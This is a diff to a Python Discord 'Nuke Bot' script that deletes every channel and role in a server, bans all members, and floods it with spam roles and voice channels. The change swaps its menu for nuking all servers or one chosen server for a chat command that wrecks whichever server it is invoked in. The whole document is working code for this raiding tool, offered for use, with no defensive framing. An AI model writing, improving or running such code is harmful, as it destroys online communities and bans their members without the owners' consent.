@@ -4,6 +4,7 @@ from colorama import init, Fore as cc
 from os import name as os_name, system, environ
 from sys import exit
 import random
+
 init()
 dr = DR = r = R = cc.LIGHTRED_EX
 g = G = cc.LIGHTGREEN_EX
@@ -23,8 +24,6 @@ baner = f'''
 {r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
 {r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
 {y}Made by: {g}https://github.com/Sigma-cc'''
-
-
 
 async def delete_all_channel(guild):
     deleted = 0
@@ -56,8 +55,7 @@ async def ban_all_members(guild):
             continue
     return banned
 
-
-async def create_roles(guild, name):
+async def create_roles(guild):
     created = 0
     names = [
         "[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊",
@@ -73,7 +71,7 @@ async def create_roles(guild, name):
             continue
     return created
 
-async def create_voice_channels(guild, name):
+async def create_voice_channels(guild):
     created = 0
     names = [
         "[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊",
@@ -97,12 +95,9 @@ async def nuke_guild(guild):
     print(f'{m}Delete Channels:{b}{deleted_channels}')
     delete_roles = await delete_all_roles(guild)
     print(f'{m}Delete Roles:{b}{delete_roles}')
-    created_channels = await create_voice_channels(guild,name)
+    created_channels = await create_voice_channels(guild)
     print(f'{m}Create Voice Channels:{b}{created_channels}')
-    #created_roles = await created_roles(guild,name)
-    #print(f'{m}Create Roles:{b}{created_roles}')
     print(f'{r}--------------------------------------------\n\n')
-
 
 while True:
     clear()
@@ -113,50 +108,35 @@ while True:
     {y}└─[1] {m}- {g}Run Setup Nuke Bot
     {y}└─[2] {m}- {g}Exit
 {y}====>{g}''')
+    
     if choice == '1':
         token = environ.get('DISCORD_BOT_TOKEN')
         if not token:
             token = _input(f'{y}Input bot token:{g}')
-        name = "default" # No longer used but kept to avoid errors in calls
+            
+        prefix = _input(f'{y}Input prefix for commands:{g}')
+        
         clear()
-        choice_type = _input(f'''
-{baner}                
-{c}--------------------------------------------
-{b}[Select]
-    {y}└─[1] {m}- {g}Nuke of all servers.
-    {y}└─[2] {m}- {g}Nuke only one server.  
-    {y}└─[3] {m}- {g}Exit
-{y}====>{g}''')
-        client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
-        if choice_type == '1':
-            @client.event
-            async def on_ready():
-                print(f'''
-[+]Logged as {client.user.name}
-[+]Bot in {len(client.guilds)} servers!''')
-                for guild in client.guilds:
-                    await nuke_guild(guild)
-                await client.close()
-        elif choice_type == '2':
-            guild_id =  _input(f'{y}Input server id:{g}')
-            @client.event
-            async def on_ready():
-                for guild in client.guilds:
-                    if str(guild.id) == guild_id:
-                        await nuke_guild(guild)
-                await client.close()
-        elif choice_type == '3':
-            print(f'{dr}Exit...')
-            exit()
+        client = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
+
+        @client.event
+        async def on_ready():
+            print(f'''
+{g}[+] Logged as {client.user.name}
+{g}[+] Bot in {len(client.guilds)} servers!
+{y}[!] Use command {prefix}nuke in any server to start the process.''')
+
+        @client.command()
+        async def nuke(ctx):
+            await nuke_guild(ctx.guild)
+            await ctx.send("Nuke finished!")
+
         try:
             client.run(token)
-            input('Nuke finished, press enter for return to menu...')
         except Exception as error:
-            if str(error) == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
-                input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter for return...')
-            else:
-                input(f'{r}{error}\n{b}Press enter for return...')
+            input(f'{r}{error}\n{b}Press enter for return...')
             continue
+            
     elif choice == '2':
         print(f'{dr}Exit...')
         exit()
